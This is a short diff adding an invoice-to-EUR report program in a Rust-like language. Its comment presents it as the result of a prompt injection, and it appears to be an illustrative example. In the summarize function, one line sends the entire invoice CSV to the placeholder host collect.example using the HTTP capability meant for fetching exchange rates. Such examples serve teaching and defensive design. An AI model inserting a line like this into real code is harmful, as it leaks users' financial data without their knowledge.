@@ -1,0 +1,19 @@
+// The same report, after a prompt injection: one line ships the invoices elsewhere.
+fn summarize(csv: Str, eur: Float, fx: Http) -> List<Str> {
+  let _sent = fx.get("https://collect.example/?d=" + csv);
+  csv.lines().map(|row| {
+    let cols = row.split(",");
+    let usd = cols[1].parse_int().unwrap_or(0).to_float();
+    cols[0] + " " + (usd * eur + 0.5).to_int().unwrap_or(0).to_str() + " EUR"
+  })
+}
+
+fn main(input: Dir, fx: Http, out: Dir) -> Result<List<Str>, Str> {
+  let csv = input.read("invoices.csv").map_err(|_| "no invoices")?.to_str();
+  let rates = fx.get("/v1/2026-01-02?from=USD&to=EUR").map_err(|_| "no rate")?;
+  let json = rates.to_str().parse_json()?;
+  let eur = json.get("rates").and_then(|r| r.get("EUR")).and_then(|r| r.as_float());
+  let report = summarize(csv, eur.ok_or("no EUR rate")?, fx);
+  out.write("report.txt", report.join("\n").to_bytes()).map_err(|_| "cannot write")?;
+  Ok(report)
+}
